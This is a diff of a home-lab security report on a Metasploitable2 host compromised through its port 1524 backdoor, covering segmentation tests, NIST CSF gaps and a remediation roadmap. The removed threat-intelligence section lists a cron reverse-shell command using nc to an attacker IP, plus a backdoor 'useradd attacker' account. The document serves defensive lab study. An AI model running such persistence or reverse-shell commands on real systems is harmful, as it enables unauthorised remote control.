@@ -70,6 +70,9 @@ If a Wazuh agent were installed, we could add a rule to detect the creation of t
 | `08:49` | Marker file created |
 | `08:50` | Segmentation tests performed (all failed) |
 
+
+![Phase A Topology](phase1-simulations/cap21.png)
+
 ### 3.3 – Segmentation Test Results
 
 | Source → Destination | Result | Proof |
@@ -78,44 +81,19 @@ If a Wazuh agent were installed, we could add a rule to detect the creation of t
 | Legacy (6.141) → Server_LAN (7.139) | ❌ Blocked | 100% packet loss |
 | Legacy (6.141) → Security_LAN (9.133) | ❌ Blocked | 100% packet loss |
 
+![Phase A Topology](phase1-simulations/cap15.png)
+
 **Conclusion:** Network segmentation **held**. No lateral movement possible.
 
 ---
 
-## 4. CTI – Threat Intelligence (MITRE ATT&CK)
 
-### 4.1 – MITRE ATT&CK Mapping
 
-| Tactic | Technique ID | Technique Name | Evidence |
-|--------|--------------|----------------|----------|
-| Reconnaissance | T1595.002 | Vulnerability Scanning | nmap scan |
-| Initial Access | T1190 | Exploit Public-Facing Application | Direct connection to port 1524 |
-| Execution | T1059.004 | Command and Scripting Interpreter | Commands via root shell |
-| Persistence | T1037.003 | Cron Job | Added cron job |
-| Persistence | T1136.001 | Create Account: Local Account | `useradd attacker` |
-| Command & Control | T1071.001 | Web Protocols | Planned reverse shell (not yet active) |
-| Lateral Movement | T1021.002 | Remote Services | Attempted ping to other zones (failed) |
 
-### 4.2 – Indicators of Compromise (IOCs)
 
-| Type | Value |
-|------|-------|
-| Source IP | `192.168.163.164` |
-| Target IP | `192.168.6.141` |
-| Backdoor Port | `1524` |
-| Backdoor User | `attacker` |
-| Cron Job | `* * * * * root /bin/bash -c 'nc -e /bin/sh 192.168.163.164 4445'` |
-| Marker File | `/root/compromised.txt` |
+## 4. GRC – Compliance & Risk Assessment (NIST CSF 2.0)
 
-### 4.3 – Executive Summary (Mandiant‑style)
-
-> On 29 July 2026, an attacker exploited the unauthenticated root shell backdoor on port 1524 of the Metasploitable2 host (192.168.6.141). Root access was obtained instantly. The attacker created a local user account (`attacker`), added a cron‑based persistence mechanism, and left a compromise marker. All attempts to pivot to other internal networks (User_LAN, Server_LAN, Security_LAN) failed due to effective network segmentation. No host‑based detection was available, and the attack remained undetected.
-
----
-
-## 5. GRC – Compliance & Risk Assessment (NIST CSF 2.0)
-
-### 5.1 – NIST CSF 2.0 Mapping
+### 4.1 – NIST CSF 2.0 Mapping
 
 | Function | Category | Subcategory | Observation | Status |
 |----------|----------|-------------|-------------|--------|
@@ -127,11 +105,11 @@ If a Wazuh agent were installed, we could add a rule to detect the creation of t
 | **Respond** | RS.AN | RS.AN‑04: Impact is estimated | No detection, no response | 🔴 Gap |
 | **Recover** | RC.RP | RC.RP‑01: Recovery plan is executed | Not applicable (baseline phase) | ⏳ Pending |
 
-### 5.2 – Segmentation Assessment
+### 4.2 – Segmentation Assessment
 
 **All cross‑zone pings failed**, confirming that OPNsense firewall rules correctly block traffic from Legacy to other internal zones. The segmentation control is fully effective.
 
-### 5.3 – Remediation Plan
+### 4.3 – Remediation Plan
 
 | Priority | Action | Owner |
 |----------|--------|-------|
@@ -143,9 +121,9 @@ If a Wazuh agent were installed, we could add a rule to detect the creation of t
 
 ---
 
-## 6. Phase B – Improvement Roadmap
+## 5. Phase B – Improvement Roadmap
 
-### 6.1 – SOC (Wazuh)
+### 5.1 – SOC (Wazuh)
 
 | Improvement | Description |
 |-------------|-------------|
@@ -153,21 +131,21 @@ If a Wazuh agent were installed, we could add a rule to detect the creation of t
 | **Custom Rules** | Add rules for user creation (`useradd`) and cron job modifications. |
 | **Suricata Rules** | Create Suricata rules to detect connections to known backdoor ports (1524, 6200, etc.). |
 
-### 6.2 – DFIR (Velociraptor)
+### 5.2 – DFIR (Velociraptor)
 
 | Improvement | Description |
 |-------------|-------------|
 | **Agent Deployment** | Deploy Velociraptor agents on Legacy systems to enable VQL investigations. |
 | **Hunt for Backdoors** | Create a hunt for SUID binaries and open ports on Legacy systems. |
 
-### 6.3 – CTI (MISP)
+### 5.3 – CTI (MISP)
 
 | Improvement | Description |
 |-------------|-------------|
 | **MISP Event** | Create a MISP event for the exploited backdoor (port 1524) and related IOCs. |
 | **IOC Sharing** | Share IOCs (attacker IP, port, filenames) with other analysts. |
 
-### 6.4 – GRC (Privilege & Segmentation)
+### 5.4 – GRC (Privilege & Segmentation)
 
 | Improvement | Description |
 |-------------|-------------|
@@ -175,7 +153,7 @@ If a Wazuh agent were installed, we could add a rule to detect the creation of t
 | **Remediation** | Retire or patch outdated systems (Metasploitable2 is intentionally vulnerable – use for testing only). |
 | **Monitoring** | Enable logging for all inbound/outbound connections to Legacy zone. |
 
-### 6.5 – Automation (Shuffle / SOAR)
+### 5.5 – Automation (Shuffle / SOAR)
 
 | Improvement | Description |
 |-------------|-------------|
@@ -184,18 +162,9 @@ If a Wazuh agent were installed, we could add a rule to detect the creation of t
 
 ---
 
-## 7. Screenshots
 
-| Step | Screenshot |
-|------|------------|
-| nmap scan of Legacy subnet | ✅ `Capture d'écran 2026-07-29 154635.png` |
-| nmap detailed scan | ✅ `Capture d'écran 2026-07-29 155354.png` & `155343.png` |
-| Root shell on port 1524 | ✅ `Capture d'écran 2026-07-29 154548.png` |
-| Failed pings to 8.143, 7.139, 9.133 | ✅ `Capture d'écran 2026-07-29 154548.png` |
 
----
-
-## 8. Conclusion
+## 6. Conclusion
 
 The Legacy zone host (Metasploitable2) was successfully compromised via the port 1524 root shell backdoor. The attacker established persistence and attempted to pivot to other internal networks, but **all attempts were blocked** by OPNsense segmentation. The attack was **not detected** at the host level due to the absence of a Wazuh agent. This highlights a critical detection gap that must be addressed.
 
